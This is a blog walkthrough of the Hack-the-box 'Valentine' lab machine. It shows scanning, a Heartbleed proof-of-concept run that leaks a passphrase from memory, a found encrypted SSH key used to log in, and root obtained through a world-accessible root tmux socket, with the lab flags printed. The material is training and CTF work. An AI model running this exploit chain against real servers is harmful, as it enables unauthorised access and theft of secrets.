---
title: "Hack-the-box Valentine"
layout: post
date: 2018-06-25 22:48
image: /assets/images/valentine.png
headerImage: false
tag:
- hack-the-box
- hearthbleed
- walktrhough
category: blog
author: Srbx7
description: Hack-the-box Valentine walktrhough
---

![banner](/assets/images/valentine.png)

# Valentine: 10.10.10.79

## Scanning:
<br>

```bash
nmap -A -oA nmap 10.10.10.79

Starting Nmap 7.01 ( https://nmap.org  ) at 2018-05-06 20:04 EDT
Nmap scan report for 10.10.10.79
Host is up (0.15s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)
80/tcp   open     http     Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp  open     ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2018-05-07T00:05:15+00:00; 0s from scanner time.
2251/tcp filtered dif-port
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.08 seconds
```

<br>

## Gaining Access:

<br>

First thing first let's see what's on those HTTP(S) applications and run a `dirb`.

![](/assets/images/79_index.png)

_index.html_
```html
<center><img src="omg.jpg"/></center>

```

Well, look what we got. A nice picture with a heart bleeding. The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet

During OSCP exam, you can use `metasploit` for only one machine. Thus, I decided to use this <a href='https://github.com/kevincarroll7737/tools/heartbleed-PoC'>tool</a>.

```bash
python heartbleed-exploit.py 10.10.10.79;head out.txt -n 50; rm out.txt
Connecting...
Sending Client Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 885
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Handshake done...
Sending heartbeat request with length 4 :
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response in file out.txt
WARNING : server returned more data than it should - server is vulnerable!
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....$text=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 19  mV0aGVoeXBlCg==.
  0160: D1 9C 3E AE 23 57 C6 09 0B 9D E3 01 7F F4 92 78  ..>.#W.........x
  0170: F7 5F 65 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ._e.............

echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=='|base64 -d                  
heartbleedbelievethehype
```

I've got stuck for a while shuffling the memory. Finally, I discovered the path `/dev` by running `nikto -host 10.10.10.79` in the HTTPS application which gave me the encoded `hype_key`.

_hype_key.txt_
```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
```

Well, the initial `nmap` shows that the ssh server accepts `RSA-2048`.

```bash
chmod 600 hype_key.txt
ssh -i hype_key.txt hype@10.10.10.79
Enter passphrase for key 'hype_key.txt': heartbleedbelievethehype

Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64)
 * Documentation:  https://help.ubuntu.com/
New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Sun May  6 17:56:59 2018 from 10.10.15.75
hype@Valentine:~$ 
```



<br>

## Maintaining Access:

<br>
```
N/A
```

<br>

## Acheive Tasks:

<br>

```bash
#Localhost
sudo scp -i hype_key.txt ~/git/tools/linenum.sh hype@10.10.10.79:~/
Enter passphrase for key 'hype_key.txt': 
linenum.sh                                                             100%   41KB  41.2KB/s   00:0o
```

Once the `linenum.sh` was on the `valentine host` I ran it and discovered that `tmux` was installed. 

I fist ran, `tmux -V` to see if this version was vulnerable to `utmp priv esc`, but it wasn't. 

`Tmux` is a strong shell emulator. It gives you the opportunity to leave terminal session and come back to them without interrupting the running process by creating a persistent socket `-S` stored localy. 



```bash
#Get the root tmux socket
hype@Valentine:~$ ps -aux|grep tmux
Warning: bad ps syntax, perhaps a bogus '-'? See http://procps.sf.net/faq.html
root       1027  0.0  0.1  26416  1688 ?        Ss   19:07   0:01 /usr/bin/tmux -S /.devs/dev_sess
hype       4406  0.0  0.0  13576   936 pts/0    S+   19:41   0:00 grep --color=auto tmux

#Connect to this socket
hype@Valentine:~$ tmux -S /.devs/dev_sess
root@Valentine:/home/hype~ id
uid=0(root) gid=0(root) groups=0(root)
oot@Valentine:/home/hype~ cat /root/root.txt
f1bb6d759df1f272914ebbc9ed7765b2
hype@Valentine:~$ find . -iname user.txt
./Desktop/user.txt
hype@Valentine:~$ cat ./Desktop/user.txt 
e6710a5464769fd5fcd216e076961750
```

So, how to manage `root tmux sockets` on a public server? Simple, make sure that this socket is a `root` dirctory

```bash
hype@Valentine:~$ ps -aux|grep tmux
Warning: bad ps syntax, perhaps a bogus '-'? See http://procps.sf.net/faq.html
root       1027  0.0  0.1  26416  1688 ?        Ss   19:07   0:01 /usr/bin/tmux -S /.devs/dev_sess
root       4588  0.0  0.1  26420  1688 ?        Ss   19:57   0:00 tmux -S /root/test
hype       4653  0.0  0.0  13576   936 pts/0    S+   19:57   0:00 grep --color=auto tmux
hype@Valentine:~$ tmux -S /root/test
failed to connect to server: Permission denied
```
